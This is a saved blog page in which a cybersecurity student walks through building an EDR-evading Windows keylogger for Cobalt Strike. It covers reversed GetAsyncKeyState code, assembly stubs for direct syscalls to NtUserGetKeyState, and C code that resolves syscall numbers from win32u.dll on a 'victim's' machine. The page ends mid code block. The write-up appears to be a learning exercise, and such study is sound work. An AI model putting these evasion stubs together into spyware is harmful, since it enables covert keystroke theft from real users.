<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    










    







<script defer language="javascript" type="text/javascript" src="/js/bundle.min.145453261a7755f5042a854c4213501d215a8fbe34c08d181c40f803f1315e74.js"></script>






    
    <meta http-equiv="content-type" content="text/html; charset=utf-8">

    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    
    <link rel="icon" href=/images/favicon-32x32_cropped.png>

    
    





  





  
  
  


<!-- Open Graph image and Twitter Card metadata -->

  
<title itemprop="name">Chaoui - Keylogger part 1 -- Advanced Keylogger</title>
<meta property="og:title" content=Chaoui&#32;-&#32;Keylogger&#32;part&#32;1&#32;--&#32;Advanced&#32;Keylogger />
<meta name="twitter:title" content=Chaoui&#32;-&#32;Keylogger&#32;part&#32;1&#32;--&#32;Advanced&#32;Keylogger />
<meta itemprop="name" content=Chaoui&#32;-&#32;Keylogger&#32;part&#32;1&#32;--&#32;Advanced&#32;Keylogger />
<meta name="application-name" content=Chaoui&#32;-&#32;Keylogger&#32;part&#32;1&#32;--&#32;Advanced&#32;Keylogger />
<meta property="og:site_name" content="My New Hugo Site" />


<meta name="description" content="" />
<meta itemprop="description" content="" />
<meta property="og:description" content="" />
<meta name="twitter:description" content="" />


<base href="http://localhost:1313/posts/keylogger-pt1/" />
<link rel="canonical" href="http://localhost:1313/posts/keylogger-pt1/" itemprop="url" />
<meta name="url" content="http://localhost:1313/posts/keylogger-pt1/" />
<meta name="twitter:url" content="http://localhost:1313/posts/keylogger-pt1/" />
<meta property="og:url" content="http://localhost:1313/posts/keylogger-pt1/" />


<meta property="og:updated_time" content="2024-08-30T14:43:53-06:00" />


<link rel="sitemap" type="application/xml" title="Sitemap" href='http://localhost:1313/sitemap.xml' />

<meta name="robots" content="index,follow" />
<meta name="googlebot" content="index,follow" />



<meta property="fb:admins" content="" />


<meta name="apple-mobile-web-app-title" content="My New Hugo Site" />
<meta name="apple-mobile-web-app-capable" content="yes" />
<meta name="apple-mobile-web-app-status-bar-style" content="black" />






<meta name="generator" content="Hugo 0.133.1">


    
    

<link type="text/css" rel="stylesheet" href="/css/bundle.min.94a339836f89f0d25f31980cb6b0631da21e20af128308747ce44e0525eb16ef.css">


    
    <style>
    body {
        --sidebar-bg-color: #202020;
        --sidebar-img-border-color: #515151;
        --sidebar-p-color: #909090;
        --sidebar-h1-color: #FFF;
        --sidebar-a-color: #FFF;
        --sidebar-socials-color: #FFF;
        --text-color: #222;
        --bkg-color: #FAF9F6;
        --post-title-color: #303030;
        --list-color: #5A5A5A;
        --link-color: #268BD2;
        --date-color: #515151;
        --table-border-color: #E5E5E5;
        --table-stripe-color: #F9F9F9;
        --code-color: #000;
        --code-background-color: #E5E5E5;
        --code-block-color: #FFF;
        --code-block-background-color: #272822;
        --moon-sun-color: #FFF;
        --moon-sun-background-color: #515151;
    }
    body.dark-theme {
        --text-color: #EEE;
        --bkg-color: #121212;
        --post-title-color: #DBE2E9;
        --list-color: #9D9D9D;
        --link-color: #268BD2;
        --date-color: #9A9A9A;
        --table-border-color: #515151;
        --table-stripe-color: #202020;
        --code-color: #FFF;
        --code-background-color: #515151;
        --code-block-color: #FFF;
        --code-block-background-color: #272822;
    }
    body {
        background-color: var(--bkg-color);
    }
</style>

</head>

    <body class="dark-theme">
        <div class="wrapper">
            <aside class="sidebar">
    <div class="container sidebar-sticky">
        <div class="light-dark" align="right">
    <button class="btn-light-dark" title="Toggle light/dark mode">
        <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
            <path fill="currentColor" d="M6 .278a.768.768 0 0 1 .08.858a7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277c.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316a.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71C0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"/>
        </svg>
        <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
            <path fill="currentColor" d="M8 12a4 4 0 1 0 0-8a4 4 0 0 0 0 8zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"/>
        </svg>
    </button>
</div>

        <div class="sidebar-about">
    <h1 class="brand">
        
            <a href="http://localhost:1313/">
                <img src="/images/midnight1.jpg" alt="brand image">
            </a>
        
        
            <a href="http://localhost:1313/">
                <h1>Chaoui</h1>
            </a>
        
    </h1>
    <p class="lead">
    Just a young cybersecurity student beginning in the domain
    </p>
</div>

        <nav>
    <ul class="sidebar-nav">

        
        
        
        
            

            
                
                
                    <li class="heading">
                        <a href="/about/">About</a>
                    </li>
                    
                
            
                
                
            
            
                
                
            
                
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
            
        
        
            

            
                
                
            
                
                
                    <li class="heading">
                        <a href="/posts/">Posts</a>
                    </li>
                    
                        <li class="sub-heading">
                            Recent
                        </li>
                        
                            <li class="bullet">
                                <a href="http://localhost:1313/posts/keylogger-pt1/">Keylogger part 1 -- Advanced Keylogger</a>
                            </li>
                        
                            <li class="bullet">
                                <a href="http://localhost:1313/posts/clipboard/">Clipboard monitoring with evasions</a>
                            </li>
                        
                            <li class="bullet">
                                <a href="http://localhost:1313/posts/introducing-poison/">Introducing Poison</a>
                            </li>
                        
                    
                
            
            
                
                
            
                
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
            
        

    </ul>
</nav>

        
    <a target="_blank" class="social" title="GitHub" href="https://github.com/Chaoui-lpb">
        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="-2 -2 24 24">
            <path fill="currentColor" d="M18.88 1.099C18.147.366 17.265 0 16.233 0H3.746C2.714 0 1.832.366 1.099 1.099C.366 1.832 0 2.714 0 3.746v12.487c0 1.032.366 1.914 1.099 2.647c.733.733 1.615 1.099 2.647 1.099H6.66c.19 0 .333-.007.429-.02a.504.504 0 0 0 .286-.169c.095-.1.143-.245.143-.435l-.007-.885c-.004-.564-.006-1.01-.006-1.34l-.3.052c-.19.035-.43.05-.721.046a5.555 5.555 0 0 1-.904-.091a2.026 2.026 0 0 1-.872-.39a1.651 1.651 0 0 1-.572-.8l-.13-.3a3.25 3.25 0 0 0-.41-.663c-.186-.243-.375-.407-.566-.494l-.09-.065a.956.956 0 0 1-.17-.156a.723.723 0 0 1-.117-.182c-.026-.061-.004-.111.065-.15c.07-.04.195-.059.378-.059l.26.04c.173.034.388.138.643.311a2.1 2.1 0 0 1 .631.677c.2.355.44.626.722.813c.282.186.566.28.852.28c.286 0 .533-.022.742-.065a2.59 2.59 0 0 0 .585-.196c.078-.58.29-1.028.637-1.34a8.907 8.907 0 0 1-1.333-.234a5.314 5.314 0 0 1-1.223-.507a3.5 3.5 0 0 1-1.047-.872c-.277-.347-.505-.802-.683-1.365c-.177-.564-.266-1.215-.266-1.952c0-1.049.342-1.942 1.027-2.68c-.32-.788-.29-1.673.091-2.652c.252-.079.625-.02 1.119.175c.494.195.856.362 1.086.5c.23.14.414.257.553.352a9.233 9.233 0 0 1 2.497-.338c.859 0 1.691.113 2.498.338l.494-.312a6.997 6.997 0 0 1 1.197-.572c.46-.174.81-.221 1.054-.143c.39.98.424 1.864.103 2.653c.685.737 1.028 1.63 1.028 2.68c0 .737-.089 1.39-.267 1.957c-.177.568-.407 1.023-.689 1.366a3.65 3.65 0 0 1-1.053.865c-.42.234-.828.403-1.223.507a8.9 8.9 0 0 1-1.333.235c.45.39.676 1.005.676 1.846v3.11c0 .147.021.266.065.357a.36.36 0 0 0 .208.189c.096.034.18.056.254.064c.074.01.18.013.318.013h2.914c1.032 0 1.914-.366 2.647-1.099c.732-.732 1.099-1.615 1.099-2.647V3.746c0-1.032-.367-1.914-1.1-2.647z"/>
        </svg>
    </a>



    <a target="_blank" class="social" title="LinkedIn" href="https://linkedin.com">
        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 448 512">
            <path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5c0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7c-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5c67.2 0 79.7 44.3 79.7 101.9V416z"/>
        </svg>
    </a>
















    <a target="_blank" class="social" title="Email" href="mailto://myblog.f9kss@passinbox.com">
       <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 485.211 485.211">
            <path fill="currentColor" d="M301.393,241.631L464.866,424.56H20.332l163.474-182.928l58.801,51.443L301.393,241.631z M462.174,60.651H23.027 l219.579,192.142L462.174,60.651z M324.225,221.67l160.986,180.151V80.792L324.225,221.67z M0,80.792v321.029L160.972,221.64 L0,80.792z"/>
       </svg>
    </a>




        <p class="footnote">
powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a target="_blank" href="https://github.com/lukeorth/poison">poison</a>
    <br>
    &copy; 2024 My New Hugo Site. All rights reserved.
</p>

  </div>
</aside>

            <main class="content container">
                <div class="post">
  <div class="info">
  <h1 class="post-title">
    <a href="http://localhost:1313/posts/keylogger-pt1/">Keylogger part 1 -- Advanced Keylogger</a>
  </h1>

  <div class="headline">
    <div>
      
      
      <time datetime=" 2024-08-30T14:43:53-0600" class="post-date">
        August 30, 2024
      </time>
      
      <span> - </span>
      <span class="reading-time">
        
          
        

        <span>9 mins read</span>
      </span>
    </div>

    
    <ul class="tags">
      
      <li class="tag-BOF">
        <a href="http://localhost:1313/tags/bof">BOF</a>
      </li>
      
      <li class="tag-spyware">
        <a href="http://localhost:1313/tags/spyware">spyware</a>
      </li>
      
      <li class="tag-evasions">
        <a href="http://localhost:1313/tags/evasions">evasions</a>
      </li>
      
      <li class="tag-cobaltstrike">
        <a href="http://localhost:1313/tags/cobaltstrike">cobaltstrike</a>
      </li>
      
    </ul>
    
  </div>

  
  
  <p class="seriesname">
    Series: <a href="http://localhost:1313/series/spybof-implem">SpyBOF implem</a>
  </p>
  

  
</div>

  <h2 id="0-basic-keyloggers">0. Basic Keyloggers</h2>
<p>Basic keyloggers are commonly built using functions like <code>GetAsyncKeyState</code> or <code>SetWindowsHookEx</code> in the Windows API to capture keystrokes. These functions allow a program to intercept and record keyboard input by monitoring key presses and releases.</p>
<p>However, they are frequently monitored and easily detected by EDR/AV software because these security tools hook into the underlying native functions to identify suspicious activity. To evade detection, more advanced techniques, such as using direct system calls (syscalls), are used.</p>
<p>Direct/indirect syscalls bypass the hooked functions and interact directly with the operating system&rsquo;s kernel, making it harder for security software to detect the keylogger. Before implementing more advanced evasion techniques, it is important to understand how the most basic keyloggers are constructed. To do this, you can consult a number of resources.</p>
<p><a href="https://www.synacktiv.com/en/publications/writing-a-decent-win32-keylogger-13" target="_blank">Writing a decent win32 keylogger</a> (2023)
<a href="https://www.cyberbit.com/endpoint-security/hawkeye-malware-keylogging-technique/" target="_blank">HawkEye Malware Changes Keylogging Technique</a> (2019)
<a href="https://eyeofrablog.wordpress.com/2017/06/11/windows-keylogger-part-1-attack-on-user-land/" target="_blank">Windows Keylogger Part 1: Attack on user land</a> (2017) (<strong>Good sum up of all basic techniques</strong>)
<a href="https://www.codeproject.com/Articles/297312/Minimal-Key-Logger-using-RAWINPUT" target="_blank">Minimal Key Logger Using RAWINPUT</a> (2012)</p>
<h2 id="1-analyse-getasynckeystate">1. Analyse GetAsyncKeyState</h2>
<p>First thing that we can see thanks to x64dbg is that GetAsyncKeyState is calling NtUserGetAsyncKeyState from ntdll.dll. We can reverse it thanks to Ghidra to find:</p>
<p><img src="/images/SpyBOF/Pasted_image_20240709092823.png" alt="Alt text"></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>SHORT <span style="color:#a6e22e">GetAsyncKeyState</span>(<span style="color:#66d9ef">int</span> vKey)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  ushort uVar1;
</span></span><span style="display:flex;"><span>  longlong lVar2;
</span></span><span style="display:flex;"><span>  uint uVar3;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* 0x282a0  1796  GetAsyncKeyState */</span>
</span></span><span style="display:flex;"><span>  uVar1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ((Win32ThreadInfo <span style="color:#f92672">!=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>) <span style="color:#f92672">||</span> (lVar2 <span style="color:#f92672">=</span> NtUserGetThreadState(<span style="color:#ae81ff">0xe</span>), lVar2 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>)) {
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ((vKey <span style="color:#f92672">-</span> <span style="color:#ae81ff">1U</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2</span>) <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)(DAT_1800ba210 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x7c4</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>)) {
</span></span><span style="display:flex;"><span>      vKey <span style="color:#f92672">=</span> vKey <span style="color:#f92672">^</span> <span style="color:#ae81ff">3</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ((((uint)vKey <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x20</span>) <span style="color:#f92672">&amp;&amp;</span> (Win32ClientInfo[<span style="color:#ae81ff">15</span>]._4_4_ <span style="color:#f92672">==</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)(DAT_1800ba210 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1b4c</span>))) <span style="color:#f92672">&amp;</span> <span style="color:#f92672">&amp;</span>
</span></span><span style="display:flex;"><span>       (uVar3 <span style="color:#f92672">=</span> vKey <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>,
</span></span><span style="display:flex;"><span>       (<span style="color:#f92672">*</span>(byte <span style="color:#f92672">*</span>)((longlong)Win32ClientInfo <span style="color:#f92672">+</span> (ulonglong)(uVar3 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">3</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x88</span>) <span style="color:#f92672">&amp;</span>
</span></span><span style="display:flex;"><span>       (byte)(<span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> ((byte)uVar3 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">7</span>))) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)) {
</span></span><span style="display:flex;"><span>      uVar1 <span style="color:#f92672">=</span> <span style="color:#f92672">-</span>(ushort)(((byte)(<span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> ((byte)vKey <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">3</span>) <span style="color:#f92672">*</span> <span style="color:#e6db74">&#39;\x02&#39;</span>) <span style="color:#f92672">&amp;</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">*</span>(byte <span style="color:#f92672">*</span>)((longlong)Win32ClientInfo <span style="color:#f92672">+</span> (ulonglong)(uVar3 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">2</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x80</span>)) <span style="color:#f92672">!=</span>  <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>              <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x8000</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>      uVar1 <span style="color:#f92672">=</span> NtUserGetAsyncKeyState(vKey);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> uVar1;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>If we really want to see how NtUserGetAsyncKeyState is built, we could follow <a href="https://doxygen.reactos.org/d4/d49/win32ss_2user_2ntuser_2keyboard_8c.html#ab695305553e9ff550bcefb0e5acec9de" target="_blank">this link</a> from ReactOS which is a open source rtateimplementation of Windows. Therefore, we can make the assumption that the implem from this OS is approximatively the same than the implem of Windows. Therefore, if we look of <a href="https://doxygen.reactos.org/d5/d72/win32ss_2user_2user32_2windows_2input_8c_source.html#l00552" target="_blank">how GetAsyncKeyState is implemented</a>, we can find something easier.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>SHORT
</span></span><span style="display:flex;"><span>WINAPI
</span></span><span style="display:flex;"><span>DECLSPEC_HOTPATCH
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">GetAsyncKeyState</span>(<span style="color:#66d9ef">int</span> vKey)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (vKey <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> vKey <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">256</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> (SHORT)<span style="color:#a6e22e">NtUserGetAsyncKeyState</span>((DWORD)vKey);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The same for GetKeyState</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>SHORT
</span></span><span style="display:flex;"><span>WINAPI
</span></span><span style="display:flex;"><span>DECLSPEC_HOTPATCH
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">GetKeyState</span>(<span style="color:#66d9ef">int</span> nVirtKey)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> (SHORT)<span style="color:#a6e22e">NtUserGetKeyState</span>((DWORD)nVirtKey);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>So, according to the direct syscalls theory, the idea is to have our own version of the 2 native functions. In this way, we can avoid the hook represented by the jump instruction. Thus, we have to do is write our own version of the native function in assembly to prepare the system call as it would be if we didn&rsquo;t have a hook. For instance, we would write in assembly the function <code>myNtUserGetKeyState</code>. This function will therefore be called every time we use <code>GetKeyState</code> in a traditional keylogger.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-nasm" data-lang="nasm"><span style="display:flex;"><span>myNtUserGetKeyState:
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> r10, rcx
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> eax, <span style="color:#ae81ff">1002</span> 
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ret</span>
</span></span></code></pre></div><p>Below we can see the syscalls number for our particular OS version. Unfortunately, the syscall numbers are not the same for all versions, so it is necessary to dynamically find the syscall number on the victim&rsquo;s PC. To do this, we&rsquo;ll have to parse the native library.</p>
<p><strong>NtUserGetKeyState</strong>
<img src="/images/SpyBOF/Pasted_image_20240709103447.png" alt=""></p>
<p><strong>NtUserGetAsyncKeyState</strong>
<img src="/images/SpyBOF/Pasted_image_20240709103112.png" alt=""></p>
<p><!-- raw HTML omitted -->NOTE<!-- raw HTML omitted -->: These 2 functions come from <strong>win32u.dll</strong> and not ntdll.dll as all other PoC higlight in their examples.</p>
<h2 id="2-retrieve-syscall-number-dynamically">2. Retrieve syscall number dynamically</h2>
<p>Recovering the syscalls numbers is fairly straightforward. The idea is that you want to retrieve the address of the desired native function. To do this, we use the 2 well-known functions GetModuleHanlde and GetProcAddress. Once we have the address of the native function, we can add 4 bytes to this address to retrieve the syscall number.</p>
<p>Why +4? If we look to the screen from x64dbg, adding 4 bytes to <code>...4E0</code> will bring us to <code>...4E4</code> that contains the bytes <code>2010</code>. Because of the little endian notation this gives us the syscall number <code>1020</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>HANDLE hWin32 <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetModuleHandleA</span>(<span style="color:#e6db74">&#34;win32u.dll&#34;</span>);
</span></span><span style="display:flex;"><span>UINT_PTR pNtUserGetKeyState <span style="color:#f92672">=</span> (UINT_PTR)<span style="color:#a6e22e">GetProcAddress</span>(hWin32, <span style="color:#e6db74">&#34;NtUserGetKeyState&#34;</span>);
</span></span><span style="display:flex;"><span>DWORD wNtUserGetKeyState <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(DWORD<span style="color:#f92672">*</span>)(pNtUserGetKeyState <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>);
</span></span></code></pre></div><p>Now, we can put in our assembly code this variable as an extern one and as a global variable in our C code. Which would give something like:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">extern</span> SHORT <span style="color:#a6e22e">myNtUserGetKeyState</span>(
</span></span><span style="display:flex;"><span>	IN		INT		vKey,
</span></span><span style="display:flex;"><span>);
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-nasm" data-lang="nasm"><span style="display:flex;"><span><span style="color:#a6e22e">.global</span> myNtUserGetKeyState
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">.extern</span> wNtUserGetKeyState
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>myNtUserGetKeyState:
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> r10, rcx
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> eax, wNtUserGetKeyState
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ret</span>
</span></span></code></pre></div><p>However, working with global variables can lead to undefined behaviour. Therefore, we can put this syscall number on the stack.</p>
<p><a href="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/wiki/04:-Chapter-2-%7C-Windows-OS-System-Calls" target="_blank">Windows system calls workshop</a></p>
<h2 id="3-move-syscall-on-the-stack">3. Move syscall on the stack</h2>
<p>Actually, putting the syscall in a global variable and import it as an extern value in the assembly code is not really a good practice and can lead to errors. Therefore, we can use the stack in order to pass the syscall as a parameter. We therefore need to undestand the <a href="https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-170" target="_blank">x64 calling convention</a> defined by Microsoft.</p>
<p>If we look at the stack. The first 32 bytes are reserved for RCX, RDX, R8, R9. These 4 registers will be used to store arguments of our function. We need more arguments, we need to add these on the stack at the address stack pointer (rsp) + 0x28 (hex). We don&rsquo;t need it for the moment because we&rsquo;ll give only 2 arguments to NtUserGetAsyncKeyState and NtUserGetKeyState. However, it will be interesting for other applications like keyboard, screenshotting, etc.</p>
<pre tabindex="0"><code>1 RCX 0X0
2 RDX 0X8
3 R8 0X10
4 R9 0X18
5 stack (rsp) + 0x28
</code></pre><p>In sum, here is what we have to modify to put the syscall number on the stack is the following.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">extern</span> SHORT <span style="color:#a6e22e">myNtUserGetKeyState</span>(
</span></span><span style="display:flex;"><span>	IN		INT		vKey,
</span></span><span style="display:flex;"><span>	DWORD			sysNum
</span></span><span style="display:flex;"><span>);
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>DWORD wNtUserGetKeyState <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(DWORD<span style="color:#f92672">*</span>)(pNtUserGetKeyState <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">myNtUserGetKeyState</span>(<span style="color:#ae81ff">1</span>, wNtUserGetKeyState);
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-nasm" data-lang="nasm"><span style="display:flex;"><span><span style="color:#a6e22e">.global</span> myNtUserGetKeyState
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>myNtUserGetKeyState:
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> r10, rcx
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> eax, edx
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ret</span>
</span></span></code></pre></div><h2 id="4-load-the-user32-library">4. Load the user32 library</h2>
<p>The direct/indirect syscalls will not work if the user32.dll is not loaded into memory. It&rsquo;s not a question of stack because it&rsquo;ll be the same if we load the library or not. Some pictures below show the different cases. On the last 2 images, we can see that the stack is the same with or without the load of user32 library. Then, we need to make assumption of why it&rsquo;s not working.</p>
<p>GetAsyncKeyState classic call without any direct/indirect syscall. Stack before syscall of NtUserGetAsyncKeyState.
<img src="/images/SpyBOF/Pasted_image_20240710104747.png" alt=""></p>
<p>Stack before indirect syscall
<img src="/images/SpyBOF/Pasted_image_20240710104848.png" alt=""></p>
<p>Stack before indirect syscall BUT!! user32 library is loaded into memory, then it works???
<img src="/images/SpyBOF/Pasted_image_20240710110800.png" alt=""></p>
<p><strong>Assumption:</strong> When loading <code>user32.dll</code> some initialisation may have occurred. Indeed, this library may initialise certain resources, functions or data structures that are required by <code>win32u.dll</code>. This includes some mappings and internal states that <code>win32u.dll</code> relies on.</p>
<p>To sum up, it&rsquo;s necessary to add this line at the beginning of the function</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>HMODULE hModule <span style="color:#f92672">=</span> <span style="color:#a6e22e">LoadLibrary</span>(<span style="color:#e6db74">&#34;user32.dll&#34;</span>);
</span></span></code></pre></div><p>And if we put our assembly code in inline-assembly into syscalls.c, we&rsquo;ll have something like.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">__asm__</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">.global myNtUserGetKeyState </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">.global myNtUserGetAsyncKeyState </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>
